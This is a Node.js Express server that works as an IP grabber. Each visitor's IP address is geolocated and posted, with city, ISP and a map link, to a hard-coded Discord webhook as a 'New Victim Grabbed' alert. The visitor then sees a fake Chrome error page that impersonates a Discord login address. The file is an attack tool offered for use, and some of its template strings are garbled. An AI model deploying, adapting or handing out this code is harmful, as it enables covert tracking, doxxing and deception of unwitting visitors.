const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ←←←←←←←←←←←←←←←← CHANGE ONLY THIS LINE ←←←←←←←←←←←←←←←←
const WEBHOOK_URL = "https://discord.com/api/webhooks/1441788885268041788/n17DxZidjM-rc_RldYGa_ROF4zzohKWlcK_ZhyY3-Cf07O0LJRPNE3XA4MmIleWdQQCM"

app.set('trust proxy', true);

// Get real visitor IP
function getIP(req) {
  return (req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress || '0.0.0.0')
    .split(',')[0].trim().replace('::ffff:', '');
}

// Main route — grabs IP and shows fake Chrome error
app.use(async (req, res) => {
  const ip = getIP(req);
  console.log(`[+] New visitor → ${ip}`);

  let geo = { country: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: null, lon: null };

  try {
    const r = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 4000 });
    geo = r.data;
  } catch (e) {
    console.log("Geo failed, continuing anyway");
  }

  // Send to Discord
  try {
    const map = geo.latitude && geo.longitude 
      ? `https://www.google.com/maps?q=\( {geo.latitude}, \){geo.longitude}` 
      : 'N/A';

    await axios.post(WEBHOOK_URL, {
      content: "@everyone",
      embeds: [{
        title: "New Victim Grabbed",
        color: 16711680,
        fields: [
          { name: "IP", value: `\`${ip}\``, inline: true },
          { name: "Country", value: `\( {geo.country_name || 'Unknown'} \){geo.country_emoji || ''}`, inline: true },
          { name: "City", value: geo.city || 'Unknown', inline: true },
          { name: "ISP", value: geo.org || 'Unknown', inline: true },
          { name: "Map", value: map === 'N/A' ? 'N/A' : `[Open Maps](${map})`, inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    });
    console.log(`Sent to Discord → ${geo.country_name || 'Unknown'}`);
  } catch (err) {
    console.error("Webhook failed:", err.response?.data || err.message);
  }

  // ←←←←←←←←←←←←←←←← Fake Chrome error page (built-in) ←←←←←←←←←←←←←←←←
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>This site can’t be reached</title>
<style>
  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f6f9fc;color:#3c4043;padding:40px}
  .c{max-width:580px;margin:0 auto;background:#fff;border-radius:8px;padding:40px;box-shadow:0 2px 10px rgba(0,0,0,.1);text-align:center}
  .i{width:72px;height:72px;background:#dadce0;border-radius:50%;margin:0 auto 24px;position:relative}
  .i::after{content:"!";font-size:44px;font-weight:bold;color:#70757a;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
  h1{font-size:24px;margin:0 0 16px}
  .err{font-weight:bold;color:#d93025}
  .url{color:#1a0dab}
  .s{margin:32px 0 0;padding-left:20px;text-align:left;color:#5f6368;font-size:14px}
  .s li{margin:12px 0}
  .f{margin-top:48px;font-size:12px;color:#9aa0a6}
</style>
</head>
<body>
<div class="c">
  <div class="i"></div>
  <h1>This site can’t be reached</h1>
  <p>The webpage at <span class="url">https://login.discordapp.com</span> might be temporarily down or it may have moved permanently to a new web address.</p>
  <p class="err">ERR_CONNECTION_TIMED_OUT</p>
  <div class="s">
    <ul>
      <li>Check your internet connection</li>
      <li>Try again later</li>
      <li>Clear your browser cache</li>
    </ul>
  </div>
  <div class="f">Grabbed from \( {geo.country_name || 'Unknown'} \){geo.country_emoji || ''}</div>
</div>
</body>
</html>
  `);
});

app.listen(PORT, () => {
  console.log(`Server running → Send victims to any path on port ${PORT}`);
});
